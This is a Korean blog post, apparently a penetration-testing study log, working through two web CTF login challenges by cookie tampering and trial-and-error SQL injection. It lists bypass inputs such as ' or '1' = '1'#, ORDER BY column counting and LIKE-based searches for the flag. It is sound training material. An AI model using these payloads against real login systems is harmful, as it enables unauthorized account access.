---
layout: post
comments: true
sitemap:
    changefreq:
    priority:

title: "[CTF] CTF 문제 풀이: SQL Injection"
excerpt: "모의해킹 취업반 스터디 7기 6주차"

date: 2024-11-26
last_modified_at: 

categories: [CTF]
tags: [TIL, WEB, DATABASE, CTF]
---

# Login Bypass 5
1. 
id: doldol
pw: dol1234
![alt text](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@master/_image/2024-11-26-7.png?raw=true)
response에서 Set-Cookie: loginUser = doldol이 보인다
![alt text](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@master/_image/2024-11-26-8.png?raw=true)
2. response를 탈취해서 loginUser를 normaltic5로 변경하겠다
![alt text](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@master/_image/2024-11-26-9.png?raw=true)

# Secret Login
1. 
id: doldol
pw: dol1234
![alt text](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@master/_image/2024-11-26-3.png?raw=true)
-> login.php과 logout.php에서 302 응답 코드가 보인다.
-> 다른 페이지로 이동시켜준다는 뜻
2. 
id: doldol' and '1' ='1
pw: dol1234
![alt text](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@master/_image/2024-11-26-4.png?raw=true)
-> sql injection이 가능하다
-> 괄호 X
3. 
id: doldol'#
pw: dol1234
![alt text](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@master/_image/2024-11-26-4.png?raw=true)
-> 주석 처리 가능
4. 
id: doldol'#
pw: asdf
![alt text](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@master/_image/2024-11-26-4.png?raw=true)
-> 식별과 인증 동시에 하는 듯
sql: select id, pw from table where id = 'id' and pw = 'pw'
5. 
id: ' or '1' = '1'#
pw: asdf
![alt text](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@master/_image/2024-11-26-5.png?raw=true)
-> ' or '1' = '1'#이렇게 하면 모든 row를 다 챙겨오는 데 하나 밖에 안 보여지다보니 가장 첫 번째 row만 보여지는 듯
6. 
id: login_acc' #
pw: asdf
-> X
-> 왜 안 되지?
-> 표시되는 게 아이디가 아니라 이름인 건가?
7. 
id: login_acc' or '1' = '1' #
pw: asdf
![alt text](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@master/_image/2024-11-26-5.png?raw=true)
8. 
id: ' or '1' = '1' order by 1, 2, 3 #
pw: asdf
![alt text](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@master/_image/2024-11-26-5.png?raw=true)
-> 아이디, 패스워드, 사용자 이름이 있다고 가정하고 시작
... 하나씩 늘려보는 중 ...
8. 
id: ' or '1' = '1' order by 1, 2, 3, 4, 5, 6, 7 #
pw: asdf
-> x
-> column이 6개인 걸 보면 표시되는 게 아이디가 아니라 이름일 가능성이 높네
-> admin의 row를 어떻게 가져올 수 있을까?
9. 
SELECT [UserId], [Password] FROM [table] WHERE [UserId] = '___' AND [Password] = '___'
column을 UserName일 것이라 추측해봄
id: ' or '1' = '1' AND UserName = 'login_acc' #
pw: asdf
-> X
10. 
id: ' or '1' = '1' AND Username = 'login_acc' #
pw: asdf
-> X
11. 
id: ' or '1' = '1' AND username = 'login_acc' #
pw: asdf
-> X
12. 
id: ' or '1' = '1' AND user_name = 'login_acc' #
pw: asdf
-> X
13. 
id: ' or '1' = '1' AND user-name = 'login_acc' #
pw: asdf
-> X
14. 
id: ' or '1' = '1' AND name = 'login_acc' #
pw: asdf
![alt text](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@master/_image/2024-11-26-5.png?raw=true)
-> 표시되는 게 유저명인 게 확실해졌고
-> column이 name이라는 것도 확인했다
-> 그렇지만 admin은 아니라는 거
-> 혹시 name에 like를 집어넣으면? flag의 경우에는 {}가 들어가니까 이걸 검색하는 걸로
15. 
SELECT * FROM [table] WHERE [UserId] = '___' or '1' = '1' AND name like '%}' #[Password] = '___'
id: ' or '1' = '1' and name like '%}' #
pw: asdf
-> X
-> 어딘가 문법이 틀렸나
16. 
id: ' or name like '%}' #
pw: asdf
-> x
17. 
id: ' or name like '%a%' #
pw: asdf
![alt text](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@master/_image/2024-11-26-5.png?raw=true)
18. 
id: ' or name like '%e%' #
pw: asdf
![alt text](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@master/_image/2024-11-26-6.png?raw=true)